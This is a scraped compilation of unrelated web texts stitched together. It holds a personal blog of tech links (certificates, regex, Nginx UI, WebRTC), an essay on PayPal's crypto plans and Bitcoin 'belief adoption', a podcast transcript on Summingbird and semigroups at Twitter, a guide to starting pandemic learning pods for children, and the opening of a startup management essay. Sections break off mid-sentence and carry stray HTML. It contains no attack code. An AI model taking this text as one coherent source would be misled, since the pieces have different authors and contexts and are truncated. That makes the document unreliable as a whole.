<p>Lo and behold, the key idea behind knowledge graphs is our old friend, types. Knowledge graphs are multi-relational graphs whose nodes and edges possess a type. Two entities can be related by multiple types, and each type can relate many pairs of entities. We can index an entity based on its type for knowledge retrieval, and use …</p></div></div>

What are you reading today? What have you learnt today that you did not know previously.</p>

<p>Software reuseability does not always allow you to copy code wholesale to be placed into another. It requires you to make tweaks and alterations to get it to work as intended in another application. It’s more of an organ transplant than a lego brick. An accurate illustration to share a point! (:</p>

<p><a ref="nofollow" target="_blank" href="https://fly.io/blog/how-cdns-generate-certificates/">How CDNs generate certificate</a></p>

<p><a ref="nofollow" target="_blank" href="http://fly.io/">fly.io</a>’s article is really interesting. It goes into the mechanics of how certifications are issued, and how does Let’s Encrypt verify your domain belongs to you. That is through the ACME protocol of course. Interstingly, they do provide free tier k8s services at $10/mth equivalent of paid services. Thats super decent. They seek to be competitive with the bigger players such as Google Cloud , Amazon Web Service and Azure.</p>

<p>If you heard about ansible, it seeks to serve the same role - configuration management. Maybe a good alternative to ansible if it has different dependences that VMs may not have for ansible.</p>

<p><a ref="nofollow" target="_blank" href="https://regexone.com/">learning regex</a></p>

<p>This website allows you to learn regex with good explanations with exercises that allows you to get your hands dirty. Being an advocate of learn by doing.  I really like how learning has been made easier for people to pick up a skill in bite sizes. No we should not spoon feed people but neither do we give a medium rare steak to a baby. Everything requires a progress and a series of steps to learn the essential skills before proceeding to a higher level competency. Personally, this is a good example of what seems like a lightweight and highly reusable static site for learning a new skill. Definitely a reference for my next pet projects.</p>

<p><a ref="nofollow" target="_blank" href="https://github.com/schenkd/nginx-ui">Nginx UI</a></p>

<p>As i was talking about Nginx as a file server, Nginx configuration has always been done via the command line and CLI. This is really amazing to have a UI for you to do your configuration with nice buttons to enable or disable your nginx settings. Really neat and interesting for you to consider on your own project.</p>

<p>If you want to create a webRTC application, there are many architecture to consider. You can read up more about them in my previous post <a ref="nofollow" target="_blank" href="https://blog.phuaxueyong.com/post/2020-06-15-how-to-make-a-video-chat-app/">here</a>. In order to scale one, you have to consider the Selective Forwarding Unit as the server to transmit your media from your device to your remote peers. One of the beliefs I have is “never reinvent the wheel”. We are in a technology era where many giants have gone before you and already created many tools available for use. So in the case of scalability, it is true that there is no one tool that helps you to address all the technical challenges, but knowing the components of a successful and scalable video call application allows you to then identify the right tools for its respective components.</p>

<p>It is interesting to see how people across the world are also attempting to solve the same problem, and this time he was able to break down the entire technology stack he used for his video call application. I wonder if it is able to deal with its scalability issue? As well. Below are a TON of articles about video call application that people has so kindly shared with me and now it is my responsibility to delve deeper into this topic and make sense of it.</p>

<p>Chanced upon this simple gadget - a full size 50 keys keyboard with a grey screen that is only about to contain 6 lines of words at any one point. This gadget was created as a way to focus on one thing - typing. For those that are in need for productivity, perhaps such a gadget can help you on that. Beyond productivity, i always wonder if students that are just starting out on their english education could start with such a gadget as well. Simple and straight to the point. It is a keyboard and all you can do is to type and make sense of what is written. But of course, english language goes beyond just stringing words together, that is only the outcome of many other fundamental skills such as grammar and understanding verbs, nouns, pronouns etc.</p>

<p>Mapillary is a geospatial company that strives to create a global street-level imagary dataset to rival Google Street View. Of all company to acquire such as Google, Apple and Microsoft, apparently facebook is the one to acquire them. Facebook actually has been actively involved in the mapping space, contributing over 800,000 kilometers of mappred roads to <a ref="nofollow" target="_blank" href="https://www.openstreetmap.org/about">OpenStreetMap</a>.

<p>Data is asset. As with all things, once we start to put our own agenda over the rights (privacy rights in this case) of people, thats where the problem starts. Although there are clause to indicate that they may still collect data from you in incognito mode, i guess this violation of rights still stands. In the realm of technology, its all chill and breezy until you start collecting data from users. That’s when you are in for a whole new ball game. Does your entire architecture considered the suite of security measures before your collect your customers first data? Like a ship, you cannot just leave the back portion of the ship unbuilt or complete before you put the ship into waters.</p>

Starting up a company is definitely a trying time and we have to gather as much meaningful knowledge and skills else we will risk bringing the company down. Community support is also crucial for us to exchange experiences and more importantly lessons from one another’s mistakes. This will definitely be something one should put some serious thought if you wish to start your own</p>

<p>Telegram has always been my go to for numerous reasons: speed, ease of use, multi device login, PIN MESSAGE feature, games, platform for bot creation and games. These are just the perks experienced by an end user myself. The security and secret channel provides a nice option for more confidential conversations as well. All powerful tools can be disastrous if it lands onto the hands of scheming ones. So i always wonder how telegram seeks to address issues of users utilizing such a powerful platform for destructive goals. Till today, this question seems to be unanswered.</p>

<p>When we want to grow, more often than not, we choose skirt the challenge before us and find easier alternatives because we feel inadequate. Here’s an example, if you want to learn a language, lets say korean, and somehow you managed to have a job offer that allows you to speak korean, but you choose to turn down that job because you dont feel confident enough in your language yet. So instead, you choose to listen to podcast at home everyday until you feel you are ready. You know what could have helped you to get better in korean? Working at a job in korean.</p>

<p>This is a common tendency as we make crippling decisions if these decisions are directed by fear. Fear has its own way to manipulate us to find alternatives with its fair share of difficulty to substitute the real thing itself. If you want to growth and succeed? There is no other way, but one way: fail forward.</p>

<div>
<p>Reporting by <a href="https://www.coindesk.com/paypal-venmo-to-roll-out-crypto-buying-and-selling" target="_blank" rel="noreferrer noopener">CoinDesk </a>on June 22 speculates that Paypal intends to facilitate the direct buying and selling of cryptocurrencies for its 325 million customer base, through both its Paypal and Venmo services. Paypal is no stranger to crypto, it has been partnered with Coinbase to facilitate fiat withdrawals for US, Candian and European users since 2016. But this move marks a shift of its crypto involvement into the mainstream realm with competing services like Robinhood and Square Cash App already having incorporated Bitcoin purchases on their own platforms.&nbsp;</p>



<p>To contextualise the significance of this, we can look at the closest reference point for crypto generated revenue on a mainstream payment platform – Square.&nbsp;</p>



<p><em>“Payments company Square (NYSE:SQ) revealed on May 6, 2020 that it generated $306 million in Bitcoin (BTC) revenue during Q1 2020…Square confirmed that volumes increased by 72% quarter-over-quarter and 367% year-over-year”&nbsp; – (Source: </em><a href="https://www.crowdfundinsider.com/2020/05/161145-payments-company-square-generated-306-million-in-bitcoin-btc-revenue-during-q1-2020/#:~:text=Payments%20company%20Square%20(NYSE%3ASQ,the%20first%20quarter%20of%202020.%E2%80%9D" target="_blank" rel="noreferrer noopener"><em>Crowdfund Insider</em></a><em>)</em></p>



<p>Square has around 24 million monthly active users, less than 10% of Paypal’s 325 million user base and 40 million active monthly users on Venmo. Paypal’s Q1 2020 reporting of $4.1 billion in net revenue is a leading indicator of what it’s crypto integration signals to the market on cryptocurrencies’ growing mindshare.&nbsp;</p>



<h3>Onboarding crypto for growth: Paypal is building a dam wall&nbsp;</h3>



<p>A move to incorporate cryptocurrency on the platform can be seen as a natural extension of PayPal’s user acquisition and growth strategy on two fronts:&nbsp;</p>



<ul><li><strong>Existing cryptocurrency market </strong>– Onboarding fiat funds for the purchase of cryptocurrency continues to be a pain point despite the proliferation of crypto trading platforms. Existing participants and enthusiasts of cryptocurrency could find PayPal to be the easier alternative for onboarding into cryptocurrency trade.&nbsp;&nbsp;</li><li><strong>New market share for cryptocurrency: </strong>As cryptocurrency grows in consumer mindshare, PayPal could act as the comfortable and trusted first stop for those unfamiliar with the territory.&nbsp;</li></ul>



<p>A globally familiar and trusted payment gateway that is crypto-friendly is perhaps best positioned to channel, contain and manage the oncoming influx of crypto related transaction activity. While others might have been slightly earlier to direct transactions, PayPal will look to leverage its brand dominance to segway as much of this activity into its own dam as possible.&nbsp;</p>



<h3>Growing Bitcoin mindshare: Paypal as a trust agent for the masses&nbsp;</h3>



<p>Bitcoin represents a digital currency that is transactable and accepted globally and can be transacted without the need for a trusted third party. Its nature as a trustless currency without borders underpins its narrative as the harbinger of the monetary revolution – a concept inherently tied to its mindshare.&nbsp;</p>



<p>Bitcoin’s value is a strange phenomenon in and of itself, where users came to a consensus in the absence of the state or platform backed trust elements that traditionally imbue assets or currencies with value. In the place of ‘trust’ the value of Bitcoin initially springboarded off ‘belief’, belief in the ‘work’ that was being done to produce the coins – i.e. the digital mining of the currency. Here the consumption of electricity required for mining represented a cost, and the value of that effort translated into Bitcoin’s value. In its initial stages this cost could be seen as negligible and its value was reflected as such within a small community of enthusiasts who saw a revolution in the monetary system. As this belief propagated, starting from a center of technological enthusiasts and moving outward, mining operations became larger with coordinated efforts and different organisations competing in the space.</p>



<p>The mining input itself didn’t equate to a proportional dollar denominated value, instead the mining represented a ‘unit of belief’ in the system. As the value assigned to this belief grew stronger, eventually drawing in speculators – the unit of belief grew more valuable. As&nbsp; mindshare for Bitcoin grew so too did its value, and in line with the whims of belief the price will continue to fluctuate gaining more stability only as the belief becomes more anchored.&nbsp;</p>



<h3>Belief driven adoption: The ripples of a grassroots technology&nbsp;</h3>



<p>We can think about belief adoption as a series of concentric circles:</p>



<ul><li>Core circle : technology enthusiasts – belief in the potential of Bitcoin</li><li>2nd circle: technically inclined –&nbsp; belief in the technical narrative and agreeing that there is value in such technology</li><li>3rd circle – speculators – belief that Bitcoin holds value as a result of the previous two circles</li><li>4th circle – lay audience – whose trust is transferred from existing trust agents / institutions etc.&nbsp;</li></ul>



<p>Knowing that the core to the 3rd circle has already been flushed with belief and crypto is primed to be adopted by a more lay audience, PayPal is well positioned to feed into the 4th layer. The trust built up over two decades across consumers and merchants can’t be overstated, especially in its ability to catalyse lay belief and participation for crypto on behalf of its 325 million users.&nbsp;</p>



<p>We increasingly see the 4th layer’s belief adoption being accelerated by both direct and more peripheral signaling. While PayPal,Robinhood, Square etc. are definitely more on the nose, the likes of the Grayscale Bitcoin Trust, Libra (Facebook’s stable currency) and bank/ state backed digital currencies are indirect feedback loops to the belief in the adoption of Bitcoin. Where it may not lead to the direct use of Bitcoin, it does bring people up the curve of trusting, understanding and utilising digital currencies.&nbsp;</p>



<p>Regardless of whether one believes that Bitcoin is a currency or not, the belief adoption cycles have given intrinsic value to Bitcoin as an asset – value that can’t be overlooked. Each layer of belief adoption was accompanied by its own miniature boom and bust cycles bringing us to today. Bitcoin still stands out as a phenomenon, where its value is entirely tied up in its belief adoption structure. Competing digital currencies from trust entities (Facebook as an example) or states still function on the idea of borders (digital or otherwise) and are intrinsically collateralised by the trust and assets of the backing entity – not quite the revolution Bitcoin represents.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Social scalability – trust minimisation in a hyper connected world</h3>



<p>Social scalability: Bitcoin’s inefficiency in computation and scalability is not a flaw but a feature.</p>



<p>“The secret to Bitcoin’s success is certainly not its computational efficiency or its scalability in the consumption of resources.&nbsp; Specialized Bitcoin hardware is designed by highly paid experts to perform only one particular function – to repetitively solve a very specific and intentionally very expensive kind of computational puzzle. That puzzle is called a proof-of-work, because the sole output of the computation is just a proof that the computer did a costly computation.”</p>



<p>“…Bitcoin’s success is that its prolific resource consumption and poor computational scalability is buying something even more valuable: social scalability. Social scalability is the ability of an institution –- a relationship or shared endeavor, in which multiple people repeatedly participate, and featuring customs, rules, or other features which constrain or motivate participants’ behaviors — to overcome shortcomings in human minds and in the motivating or constraining aspects of said institution that limit who or how many can successfully participate. Social scalability is about the ways and extents to which participants can think about and respond to institutions and fellow participants as the variety and numbers of participants in those institutions or relationships grow.&nbsp; It’s about human limitations, not about technological limitations or physical resource constraints…”</p>



<p>Social scalability is measured by the ability of participants to coordinate efficiently for the continued extraction of value even as the network scales. As networks grow, there is a requirement for increasing the level of trust. But with this increase, comes the added cognitive burden for individuals on the potential harms in the network, thus decreasing efficiency. This is especially true of our hyper connected world, where we are required to place trust in many intermediaries to gain benefit from the network. Trust minimisation then becomes an important factor in achieving greater levels of social scalability.&nbsp;</p>



<p>“One way to estimate the social scalability of an institutional technology is by the number of people who can beneficially participate in the institution. Another way to estimate social scalability is by the extra benefits and harms an institution bestows or imposes on participants, before, for cognitive or behavioral reasons, the expected costs and other harms of participating in an institution grow faster than its benefits.”</p>



<p>“Satoshi’s breakthrough with money was to provide social scalability via trust minimization: reducing vulnerability to counterparties and third parties alike. By substituting computationally expensive but automated security for computationally cheap but institutionally expensive traditional security, Satoshi gained a nice increase in social scalability. A set of partially trusted intermediaries replaces a single and fully trusted intermediary.”</p>



<p>In order to address the stunting of social scalability in an increasingly hyper connected world, starting from base principles, even with the trade off of efficiency, is an effective method. Traction may be much slower, but from its humble beginnings it could provide humanity with a model for social scalability that would otherwise have been unavailable. The belief that this form of social scalability holds value is demonstrated by the game theory mechanics of the energy expended to secure the network, compared to the value attributed to a Bitcoin by …</p></div></div></div>

You can calculate things on years of data, but doing the calculation might take a day. Real-time is much faster, but you can sort of only work forward in time. Really, you need both these things. If I want to look at my most liked tweet, I need to look at all the old batch data, but also any real-time tweets that I’m doing&nbsp;</span></p><p><span>So it’s 2013 Sam Ritchie is a mechanical engineer by training is uncle is Dennis Richie, and he’s working at Twitter, and his job is just translating from one system to the other from real-time to a batch job.</span></p><p><b>Sam:</b><span> And there’s just so many jobs that looked like that, and it kind of looked like that was going to be my life, like just coding these things.&nbsp;</span></p><p><span>You just said enough is enough. Like we need to figure out how to write one piece of code that will run in a real-time world and also in batch world.</span></p><p><b>Adam: </b><span>I guess I’ve come up with the problem from that side where it’s like, “oh, I can calculate this thing, but I just started calculating it and like, the world existed before.”</span></p><p><b>Sam: </b>Y<span>eah, the backfill problem’s hard and it’s hard. Like it just consumes your life writing, you know, backfill jobs and you kinda, you, you stick to really simple things because you know, you’re gonna have to write them twice. You’re going to have to maintain them twice.&nbsp;</span><span>I mean, it’s really not a nice way to live.&nbsp;</span></p><h2><b>Backstory</b></h2><p><b>Adam:</b><span> Hello and welcome to co recursive. I’m Adam Gordon bell. How did Sam get away from these one-off jobs? How did they solve this fast versus big data issue? An issue many are still struggling with, the answer isn’t some new data processing system that he’s here to show.&nbsp;</span></p><p><span>Well, the answer is actually abstract Algebra and probabilistic data structures.&nbsp; If you don’t know what those are, don’t worry. We’re going to walk through it. We’re also going to talk about what Sam calls portal abstractions. That’s finding abstractions that let you leverage work from other fields, But we’ll do that at the ending. </span><span>Let’s start at the beginning. When Sam was working away at Twitter.</span></p><p><b>Sam: </b><span>I was on the revenue team.&nbsp; I had a colleague named Oscar Boykin who I didn’t know that well. We both maintained one of these like libraries I mentioned before that lived on top of a dupe. He had the scala version. I had this closure version and I’m kind of yet again, I had a task for work that was like building one of these dashboards.</span></p><p><span>You’re trying to count something like, you know, tweets per user per day. You’re just basically grouping on some key and then adding numbers to a database. And there are just so many jobs that looked like that, and it kind of looked like that was going to be my life, like just coding these things.&nbsp;</span></p><p><span>Through, you know, this or that, Oscar and I teamed up to work on some shared piece of machinery for serialization between the code we both maintained and we realized that like we both were doing this sort of thing and he’s got a lower tolerance for BS. You just said enough is enough.&nbsp;</span></p><p><span>Like we need to figure out how to write one piece of code that will run in the real-time world and also in the batch world.&nbsp; &nbsp;Like this is, this happens with compilers, like this is a compiler problem. Let’s just back off and solve it.&nbsp;</span></p><p><b>Adam: </b><span>So they solve it. They built version one of this open-source analytics system could do a batch, it could do real-time. Some of the results together. They called it a Summingbird. It sums things, and it’s from Twitter, so it’s a bird. But then they had some interesting revelations about what they had created.</span></p><h2><b>Stitching Things Together</b></h2><p><b>Sam:</b><span> You know, if you really simplify what we’re dealing with here,&nbsp; you’re writing code that is generating for some key, tweets per user, per hour, something that happens. It might just tweet per user, it might be how many users we have.&nbsp;</span></p><p><span>And then you have some value, you have some counter that you’re ticking, so you’re just incrementing this thing up. And so many machines learning features and dashboards and everything is just like ticking counters. It’s kind of like and that’s like the secret of analytics work is you’re just adding ones. That seems suspicious too. Like that’s something you could maybe break out of like a really, is that all we can do? Like how would you do more complicated things? But so this, this software package, Summingbird was a library that lets you write a logical declaration of what you wanted to happen. And then, the second component of it would take, that data structure that you’ve built and go run it on any number of these different, underlying platforms.&nbsp;</span></p><h2><b>The God of Counting</b></h2><p><span><strong>Sam:&nbsp;</strong> So I can power a dashboard. I can do backfills. I have this boundary that’s maintained transparently to me, that behind the scenes we’ll give a hard line between the, you know, massive, multi-year database. And then the last couple of hours that are stored in some much harder to manage, much more fragile, but very, very fast, you know, online processing system.</span></p><p><span>And you know, phase one was just write something that can do, you know logically you’re doing the same thing. You’ve been rewriting the same code. Just have the machine write it for you. but it does open this door and this is the topic I wanted to get to.</span></p><p><span>It opens the door and you start to look at this thing and think you know, you have these two buckets. One is like all, all-time before a couple of hours ago, and then you have a bucket for each of the recent hours. So you’re doing this addition of some of the numbers, Uh, but you’re sort of putting parentheses in one case around like years and years of data, and then another set of parentheses around like each of the previous few hours, and then you take this final step of adding them together.</span></p><p><b>Adam:</b><span> If you’re calculating how many times I’ve tweeted, like Hadoop gets like everything up to yesterday, and then I’m adding that to something that’s actually getting the real-time data and just</span></p><p><b>Sam: </b><span>That’s right.</span></p><h2><b>Abstract Algebra</b></h2><p><b>Sam: </b><span>&nbsp;Those are nice ideas, but they’re not that they’re sort of obvious and not that powerful. But this idea of adding things and putting parentheses wherever you want, It also seems kind of innocuous. It’s like this little lamp you pick up, right? It looks kind of, you know, you rub the lamp, you and what you find is like, this idea is not, it’s not your new idea.</span></p><p><span>It’s very simple, but it actually exists in this field of abstract algebra.</span></p><p><b>Adam: </b><span>Alright. Abstract algebra, if you’re not familiar with it, it’s a subfield of math. Stick with me here. I’ll explain it a little bit. A lot of concepts from abstract algebra can be implemented in a programming language. A semigroup is one of these. It’s an interface. It has one method. That method is add or sum. If we want to stick with the summingbird pun. It also has a rule that things have to be associative. You might remember associativity from a high school math class.</span></p><p><span>What happened here is Sam had the system where to calculate analytics. The calculation had to implement a certain interface and then the system could run it in both worlds. The interface had an add method, which meant it was a semigroup, which meant this subfield of math with people talking about seemingly obscure constructs could suddenly enable him to answer interesting questions in his real-time analytics dashboard thing at Twitter.</span></p><p><b>Sam: </b><span>So yeah, you can start slimming things back, and when you slimmed it back almost to nothing, you’re left with this object called a semigroup, which is an idea of: okay I need some set of things. So numbers in what we’ve been doing, which is just counting, some way to quote, add two of them together and get something out that’s like still the same type and then a test that goes along with that. So the test is that I have to be able to do that associatively.&nbsp;</span></p><p><span>So this is kind of, it sort of sounds like a pedantic Mathy thing. Like there’s this impulse that I’m sure we can get into in the functional programming world to like, like see ideas that seemed mathy and like slap math names on them and just tweet about it and to like spraying that and that, that sucks.</span></p><p><span>But I think it’s, the, the thing you get when you do that when you identify …</span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-24d5bd2a5b5175cc93b5"><div><p>With social distancing policies in place, many families have been longing for a way for their children to connect socially - or desperately looking for viable childcare options while schools and daycares are closed. </p><p>Hiring a full-time nanny or teacher to engage with children while families are working is simply not a feasible option for many families. Even with some schools scheduled to re-open in the fall, families may feel uncomfortable with their children gathering in large groups, putting them or more vulnerable family members at risk of infection.&nbsp;&nbsp;</p><p>All of these reasons and more have led many families to consider starting learning pods, microschools, homeschool co-ops or childcare swaps.&nbsp;</p><p>For the last 5 years, I’ve helped hundreds of parents and teachers start or join microschools. The families who joined these schools came for a variety of reasons. For older children, they were looking for more personalized learning, but couldn’t afford private school. For younger children, many families didn’t have free or affordable preschool options available and were looking for ways to save money. Some were looking for learning environments that better accommodated special needs, had more diversity or were catered to special interests such as bilingual education.&nbsp;&nbsp;Others felt that their children would develop better friendships in a smaller group setting.</p><p>What these families found was wonderful play-based learning opportunities, education tailored to their children’s strengths and interests, teachers their children loved and most importantly, an incredible community of families - and friends for life.&nbsp;</p><p><strong>A word about health and safety</strong></p><p>If you’re thinking about starting a learning pod during the pandemic, it’s important that you’re fully informed and prepared for the risks this might involve. Research suggests that joining a small microschool is safer than returning to school, but there are still <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">risks </a>to consider. </p><p>These are the most important things to know and keep in mind:</p><p><em>Children catch Covid-19</em></p><p>When considering starting a learning pod during a global pandemic, it’s important to be serious about health and safety concerns. While children don’t often exhibit symptoms of Covid-19, they are just as likely to catch COVID-19 as adults and can definitely pass it on. If one family in your learning pod catches COVID-19, the rest of the members will very likely be infected.&nbsp;</p><p><em>Wear masks</em></p><p>Masks can greatly reduce the threat of COVID-19. Whether or not your children return to school or join a learning pod, wear masks. <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">Masks will greatly reduce the chance of catching this disease</a>.  Learn more about how masks can help reduce the threat of COVID-19 and what happened when schools re-opened in Israel and Melbourne <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">here.</a></p><p><em>Consider doing your learning pod online</em></p><p>Many parents have a negative view of online learning and socialization because our educational institutions and providers that were doing learning in-person have had difficulty adjusting to this new medium. Online experiences have been painful and unpleasant. That said, it doesn’t have to be that way. There are plenty of wonderful ways kids are socializing online. And you can certainly <a href="https://www.modulo.app/all-resources/onlineconnections">build meaningful social connections</a> in an online learning pod.&nbsp;&nbsp;Learn more about helping kids develop social skills online <a href="https://www.modulo.app/all-resources/onlineconnections">here</a>.</p><p><strong>The checklist: Here is what you’ll need to do to start your learning pod</strong></p><ol data-rte-list="default"><li><p>Decide what you want</p></li><li><p>Choose a curriculum (or make it play-based)</p></li><li><p>Find a teacher (or swap)</p></li><li><p>Find another family (or families) to join</p></li></ol><p><strong>Step 1. Get clear on what you want</strong></p><p><em>Curriculum, schedule, ages, philosophy</em></p><p>You’ll be able to start your learning pod a lot more quickly and manage expectations better if you figure out what you want before you start looking for another family. It can definitely be fun to collaborate with other families and a teacher in developing your learning pod. However, if you try to be all things to all people, it might end up falling apart. It won’t be difficult to find another family. I recommend choosing your curriculum, schedule, ages and teacher (unless you plan on being a teacher) and then presenting your plan to your community to see who wants to sign on.</p><p><strong>Choose curriculum: </strong>There are so many wonderful curricula for secular homeschool families. And you absolutely don’t have to be a teacher to use them. Any of them can easily be led by a parent or caregiver in a small group with little to no prep time.&nbsp; If you decide to get an experienced teacher to lead your group or it’s more focused on social/childcare than learning you don’t necessarily need a curriculum. Here are a few of my favorites. I strongly encourage you to choose a curriculum that works for your child and then invite other families to join in.&nbsp;</p><p><strong>Here are a few of my favorites</strong> and a review I’ve written on each of them (note that these are equally great if you decide to focus on 1-1 instruction with your children). They require very little prep and minimal parent involvement.</p><ul data-rte-list="default"><li><p><a href="https://www.modulo.app/all-resources/khan-app-kids"><span>Khan App Kids</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/khanacademy"><span>Khan Academy</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/criticalthinkingco"><span>Critical Thinking Co</span></a></p></li><li><p><a href="https://blossomandroot.com/"><span>Blossom and Root</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/moving-beyond-the-page"><span>Moving Beyond the Page</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/oakmeadow"><span>Oak Meadow</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/time4learning"><span>Time4Learning</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/torchlight"><span>Torchlight</span>	</a></p></li></ul><ul data-rte-list="default"><li><p><strong>Language:&nbsp; </strong>Decide if you want the pod to be conducted in another language besides English. Language immersion is always a great way for children to learn and pods are a great way to help children develop their maternal language skills or learn a new one.</p></li></ul><ul data-rte-list="default"><li><p><strong>Number of families: </strong>Choose how many families you want to join. While we’re in this pandemic, I strongly recommend only one another family who is also practicing rigorous social distancing. Generally pods tend to have anywhere between 5-10 kids. Pods with children under 5 should not have more than 1 teacher for 4 children. Pods with children 6 and up generally do well with 5-10 kids and one teacher or a teacher and assistant.</p></li></ul><ul data-rte-list="default"><li><p><strong>Ages:</strong> decide what ages you feel comfortable letting into your group. Ages can absolutely be mixed and differentiated learning is wonderful for learning. If you have siblings of very different ages, you may want to create a wider range. Generally good age groups to combine together are <strong>1) 5 and under 2) 6-9 3) 9-12 4) 13 and up. </strong>Pods can becoming challenging for older kids who need a bigger and more diverse group - and you really might want to consider an online option for this age group.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Schedule: </strong>If the goal of your program is to provide learning and social interaction for your children, and childcare isn’t that important to you, generally 2-3 days a week or 2-3 mornings or afternoons a week (for younger kids)&nbsp; is more than enough to accomplish this.</p></li></ul><ul data-rte-list="default"><li><p><strong>If you want to swap:</strong> Decide how the arrangement will work. Do you want to swap days or half days? How many families do you want to get involved? Will you rotate homes (I recommend having one central location if you can rather than swapping houses) What kind of parenting style do you feel comfortable with?</p></li></ul><ul data-rte-list="default"><li><p><strong>Values:&nbsp; </strong>Write a list of all the things that are important to you. Do families need to be on time? Do you want other families to participate in some way. How do you feel about parents coming late or leaving early? What’s your approach to parenting?&nbsp; What are your views on diversity and inclusion? Is your pod secular or religious? What rules do you expect other families to follow in your house?&nbsp; Make sure you’re very clear on your values so you’re sure that you’re aligned with the other family joining.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Budget: </strong>Your costs will include teacher, curriculum, background check and “school supplies.” The main cost is hiring a teacher or babysitter to lead the group. However, if you’re swapping with other families, which is a great option, then that cost is free! Think about what you can afford to pay a leader. I recommend paying at least $40/hr to a trained teacher.&nbsp; If you decide to have your caregiver lead your group, I recommend starting at $25/hr for 2 children, $30 for 3 and an additional $5 for each child who joins. School supplies generally won’t cost more than $200/year. It costs about $50 to run a background check on the leader of your group. Curriculum can range from $20 to $500 for the whole group for the whole year. There is plenty of free and discounted curriculum in homeschool groups.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Pick a location: </strong>Decide if you want this to take place outside, at your house, at a teacher’s home or alternate homes. For health reasons, for consistency and also for setting up an environment conducive to learning, I recommend not swapping homes, but many have done it with success.&nbsp;<br></p></li><li><p><strong>Make sure you are following childcare and schooling laws in your state: </strong>Generally two children can be considered a license-exempt childcare. However, if you are over age 6, you will generally have to file as a homeschooler or be enrolled in some type of school.  Remember that you have a constitutional right to educate your child as you see fit, but there may be specific guidelines in some states regarding how many children can gather with a paid caregiver or teacher. <a href="https://www.withprimer.com/">Primer</a> has a state-by-state homeschool regulations navigator that you can use.  If your child is under 5, check <a href="https://www.noodle.com/articles/l/preschool-how-preschool-works-by-state">Noodle’s</a> state by state guide for preschool laws. You can also contact your department of education or child care services for more information. We are also happy to help you find the right information for your state, as these laws can sometimes be confusing and even contradictory!</p></li></ul><ul data-rte-list="default"><li><p><strong>Write a one paragraph post:</strong> Come up with one paragraph you can post to social media that includes a little bit about your family, your vision for the program, schedule, ages and your general location that you can use to post to parent groups looking for a teacher, caregiver or other families.&nbsp;</p></li></ul><p><strong>Step 2. Find a teacher&nbsp;&nbsp;</strong></p><p>Once you’ve figured out what you want and how much you’re willing to pay, you can start looking for a teacher. If you already have a nanny or caregiver or family watching your child, they can absolutely be the leader of the group. I’ve found the best place to find teachers and caregivers is local facebook parenting groups.&nbsp; Other place to find teachers include babysitting sites like care.com or urban sitter …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>Over the course of the past few years running my startup, it’s almost ludicrous just how much I’ve learnt. From how to turn a coffee-table conversation into a working product, a product into a scalable venture, scalable venture into multi-million dollar funding rounds, etc.</p><p>But no single area of learning has been as valuable, scalable or effective as the knowledge of how to manage a team. As soon as you have more than one person working on something the dynamic shifts completely  —  in ways that are hard to quantify from the outset no matter how prepared you think you are.</p><p>It’s a strange phenomenon, since usually you’re hiring someone to fill a gap that you desperately need sealed. Or to pick up some slack that you simply cannot straighten out yourself. </p><p>But no matter what, scaling from a solo-operator, or solo-engineer/designer/salesperson to a “team” requires a change in process, clarity and, most importantly, <strong>your own psychology</strong>.</p><p>As a matter of fact, one could make a compelling case that learning how to manage a team is actually an exercise in learning how to manage oneself &nbsp;first  —  and as an extension, others.</p><p>No longer can you (or should you) see yourself as the “hero”, the builder of the product, the linchpin of the organization. You’re now forced to see yourself as a curator of talent, a facilitator of alignment and collaboration, a guiding light when there is encroaching darkness and a steady hand on the rudder when seas get rough.</p><p>The following are a collection of principles I have leaned on and continue to lean on, refine, and adapt to the changing environment. Some of them may be bullshit, others may be timeless. That’s besides the point. </p><p>The main goal is to put them down for myself, for accountability, for updating, and in the off-chance that they prove useful to others who happen to stumble upon.</p><p>‍</p><h3>TL;DR&nbsp;Quick List Of Principles. Click to scroll.</h3><ol start="1" role="list"><li><a href="#1">People are most often looking for either guidance or confirmation i.e. “Ask before answering”.</a></li><li><a href="#2">Always apologize first, or make it clear you won’t i.e. “Limbo Kills”.</a></li><li><a href="#3">Respect and love define a leader  —  not age, experience, title or role.</a></li><li><a href="#4">Don’t equate long work for hard work.</a></li><li><a href="#5">In times of conflict  —  breathe, empathize, return.</a></li><li><a href="#6">Before you can win, you have to make sure everyone is playing the same game.</a></li><li><a href="#7">Things don’t gain importance by words, they gain importance by actions alone.</a></li><li><a href="#8">Simplicity is not always the goal, complexity is not always the answer</a></li><li><a href="#9">No management book will ever teach you the real thing.

People are most often looking for either guidance or confirmation i.e. “Ask before answering”.</h3><p>Most people (myself included), though they’d be chaste to admit it, have very high opinions of their own thoughts and decisions. It can be all too easy to fall in love with the sound of your own voice without understanding just what it is that others are looking for. </p><p>In most cases people are listening to you to be polite  —  there are exceptions of course. But in a majority of cases I’ve found that people are looking for one of two things  —  <strong>guidance</strong> or <strong>confirmation</strong>.</p><p>There are different strategies for dealing with either scenario but the main principle here is to understand which situation you are in. The way you respond to someone looking for confirmation, who has already made up their mind, ought to be vastly different than those who need your expertise and advise.</p><p>It’s not that you should always agree with their decision, not at all, but if you don’t understand that confirmation is what the person is looking for and you begin offering them guidance it’s all too common for your words to fall on deaf ears.</p><p>Know which game you are going to play before you prance on the field.</p><p>‍</p><h3>2. Always apologize first, or make it clear you won’t i.e. “Limbo Kills”.</h3><p>The worst thing that can happen between two team members is <strong>not</strong> conflict —  that’s actually relatively easy to deal with. Usually stemming from miscommunication, talking past each other or — on rare occasions — toxic personalities, conflict tends to lend itself well to mediation.</p><p>Situations with conflict also have the added benefit that they are either 